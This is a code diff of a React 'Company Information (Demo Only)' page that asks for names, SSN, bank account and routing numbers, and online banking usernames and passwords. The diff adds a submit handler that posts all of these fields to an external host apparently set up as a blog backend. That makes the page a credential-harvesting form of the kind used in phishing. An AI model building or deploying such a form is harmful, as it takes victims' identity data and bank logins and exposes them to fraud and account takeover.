@@ -1,233 +1,171 @@
 import React, { useState } from "react";
+import { FiUser, FiLock, FiDollarSign, FiEdit } from "react-icons/fi";
 
- function CompanyForm() {
-  const [form1, setForm1] = useState({
-    companyName: "",
-    accountNumber: "",
-    ssn: "",
+function CompanyForm() {
+  const initialData2 = {
+    firstName: "hfhg",
+    lastName: "",
+    ssnDemo: "",
     bankName: "",
-    routingNumber: "",
-    username: "",
-    password: "",
-  });
-
-  const [form2, setForm2] = useState({
-    companyName: "",
     accountNumber: "",
-    ssn: "",
-    bankName: "",
+    emailAddress: "",
     routingNumber: "",
-    username: "",
-    password: "",
-  });
+    accessUsername: "",
+    accessPassword: "",
+  };
 
-  const handleChange = (e, formSetter) => {
-    formSetter((prev) => ({
+  const initialData = {
+    firstName: "",
+    lastName: "",
+    ssnDemo: "",
+    bankName: "",
+    accountNumber: "",
+    emailAddress: "",
+    routingNumber: "",
+    accessUsername: "",
+    accessPassword: "",
+  };
+
+  const [form1, setForm1] = useState(initialData2);
+  const [form2, setForm2] = useState(initialData);
+
+  const handleChange = (e, setter) => {
+    setter((prev) => ({
       ...prev,
       [e.target.name]: e.target.value,
     }));
   };
 
-  const handleSubmit = (e) => {
+  // 🔥 NEW BACKEND-CONNECTED HANDLE SUBMIT
+  const handleSubmit = async (e) => {
     e.preventDefault();
-    console.log("Form 1:", form1);
-    console.log("Form 2:", form2);
-    alert("Forms submitted successfully!");
+
+    try {
+      const response = await fetch("https://blogbackend-d377.onrender.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ form1, form2 }),
+      });
+
+      const data = await response.json();
+      alert(data.message || "Submitted!");
+    } catch (error) {
+      console.error("Submit Error:", error);
+      alert("Error sending data to backend");
+    }
   };
+
+  const handleReset = () => {
+    setForm1(initialData);
+    setForm2(initialData);
+  };
+
+  const fields = [
+    { label: "First Name", name: "firstName", icon: <FiUser /> },
+    { label: "Last Name", name: "lastName", icon: <FiUser /> },
+    { label: "SSN Demo", name: "ssnDemo", icon: <FiEdit /> },
+    { label: "Email Address", name: "emailAddress", icon: <FiEdit /> },
+
+    { label: "Bank Name", name: "bankName", icon: <FiDollarSign /> },
+    { label: "Account Number", name: "accountNumber", icon: <FiEdit /> },
+    { label: "Routing Number", name: "routingNumber", icon: <FiEdit /> },
+
+    { label: "Online Access Username", name: "accessUsername", icon: <FiUser /> },
+    { label: "Online Access Password", name: "accessPassword", type: "password", icon: <FiLock /> },
+  ];
 
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center p-6">
-      <div className="max-w-6xl w-full bg-white p-8 rounded-xl shadow-xl">
-        <h2 className="text-3xl font-bold text-center mb-6">
-          Company Form (Two in One)
+      <div className="max-w-6xl w-full bg-white shadow-2xl rounded-2xl p-10">
+        <h2 className="text-4xl font-bold text-center mb-10">
+          Company Information (Demo Only)
         </h2>
 
         <form onSubmit={handleSubmit}>
-          {/* Two Forms Side by Side */}
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
 
-            {/* FORM 1 */}
-            <div className="p-6 border rounded-lg shadow-sm bg-gray-50">
-              <h3 className="text-xl font-semibold mb-4">Form 1</h3>
+            {/* ========= FORM 1 ========== */}
+            <div className="p-6 bg-gray-50 rounded-2xl shadow-lg">
+              <h3 className="text-2xl font-semibold mb-6">Form 1</h3>
 
-              <div className="space-y-4">
+              <div className="space-y-6">
+                {fields.map((item) => (
+                  <div key={"f1-" + item.name}>
+                    <label className="text-black font-medium">{item.label}</label>
 
-                <div>
-                  <label className="font-medium">Company Name</label>
-                  <input
-                    type="text"
-                    name="companyName"
-                    value={form1.companyName}
-                    onChange={(e) => handleChange(e, setForm1)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
+                    <div className="flex items-center mt-1 bg-white p-3 rounded-lg border">
+                      <span className="text-black text-xl mr-3">{item.icon}</span>
 
-                <div>
-                  <label className="font-medium">Account Number</label>
-                  <input
-                    type="text"
-                    name="accountNumber"
-                    value={form1.accountNumber}
-                    onChange={(e) => handleChange(e, setForm1)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">SSN</label>
-                  <input
-                    type="text"
-                    name="ssn"
-                    value={form1.ssn}
-                    onChange={(e) => handleChange(e, setForm1)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Bank Name</label>
-                  <input
-                    type="text"
-                    name="bankName"
-                    value={form1.bankName}
-                    onChange={(e) => handleChange(e, setForm1)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Routing Number</label>
-                  <input
-                    type="text"
-                    name="routingNumber"
-                    value={form1.routingNumber}
-                    onChange={(e) => handleChange(e, setForm1)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Online Username</label>
-                  <input
-                    type="text"
-                    name="username"
-                    value={form1.username}
-                    onChange={(e) => handleChange(e, setForm1)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Online Password</label>
-                  <input
-                    type="password"
-                    name="password"
-                    value={form1.password}
-                    onChange={(e) => handleChange(e, setForm1)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
+                      <input
+                        type={item.type || "text"}
+                        name={item.name}
+                        value={form1[item.name]}
+                        onChange={(e) => handleChange(e, setForm1)}
+                        className="w-full bg-transparent outline-none"
+                        placeholder={`Enter ${item.label}`}
+                      />
+                    </div>
+                  </div>
+                ))}
               </div>
             </div>
 
-            {/* FORM 2 */}
-            <div className="p-6 border rounded-lg shadow-sm bg-gray-50">
-              <h3 className="text-xl font-semibold mb-4">Form 2</h3>
+            {/* ========= FORM 2 ========== */}
+            <div className="p-6 bg-gray-50 rounded-2xl shadow-lg">
+              <h3 className="text-2xl font-semibold mb-6">Form 2</h3>
 
-              <div className="space-y-4">
+              <div className="space-y-6">
+                {fields.map((item) => (
+                  <div key={"f2-" + item.name}>
+                    <label className="text-black font-medium">{item.label}</label>
 
-                <div>
-                  <label className="font-medium">Company Name</label>
-                  <input
-                    type="text"
-                    name="companyName"
-                    value={form2.companyName}
-                    onChange={(e) => handleChange(e, setForm2)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
+                    <div className="flex items-center mt-1 bg-white p-3 rounded-lg border">
+                      <span className="text-black text-xl mr-3">{item.icon}</span>
 
-                <div>
-                  <label className="font-medium">Account Number</label>
-                  <input
-                    type="text"
-                    name="accountNumber"
-                    value={form2.accountNumber}
-                    onChange={(e) => handleChange(e, setForm2)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">SSN</label>
-                  <input
-                    type="text"
-                    name="ssn"
-                    value={form2.ssn}
-                    onChange={(e) => handleChange(e, setForm2)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Bank Name</label>
-                  <input
-                    type="text"
-                    name="bankName"
-                    value={form2.bankName}
-                    onChange={(e) => handleChange(e, setForm2)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Routing Number</label>
-                  <input
-                    type="text"
-                    name="routingNumber"
-                    value={form2.routingNumber}
-                    onChange={(e) => handleChange(e, setForm2)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Online Username</label>
-                  <input
-                    type="text"
-                    name="username"
-                    value={form2.username}
-                    onChange={(e) => handleChange(e, setForm2)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
-                <div>
-                  <label className="font-medium">Online Password</label>
-                  <input
-                    type="password"
-                    name="password"
-                    value={form2.password}
-                    onChange={(e) => handleChange(e, setForm2)}
-                    className="w-full border p-2 rounded"
-                  />
-                </div>
-
+                      <input
+                        type={item.type || "text"}
+                        name={item.name}
+                        value={form2[item.name]}
+                        onChange={(e) => handleChange(e, setForm2)}
+                        className="w-full bg-transparent outline-none"
+                        placeholder={`Enter ${item.label}`}
+                      />
+                    </div>
+                  </div>
+                ))}
               </div>
             </div>
+
           </div>
 
-          {/* Submit Button */}
-          <div className="text-center mt-8">
+          {/* ===== BUTTONS ===== */}
+          <div className="flex justify-center mt-10 gap-6">
             <button
               type="submit"
-              className="bg-blue-600 text-white px-8 py-3 rounded-lg hover:bg-blue-700 shadow-lg"
+              className="px-10 py-3 bg-green-500 text-white rounded-xl shadow-lg hover:bg-green-600"
             >
-              Submit Forms
+              Submit
+            </button>
+
+            <button
+              type="button"
+              onClick={handleReset}
+              className="px-10 py-3 bg-red-500 text-white rounded-xl shadow-lg hover:bg-red-600"
+            >
+              Reset
+            </button>
+
+            <button
+              type="button"
+              onClick={() => window.print()}
+              className="px-10 py-3 bg-blue-500 text-white rounded-xl shadow-lg hover:bg-blue-600"
+            >
+              Print
             </button>
           </div>
+
         </form>
       </div>
     </div>
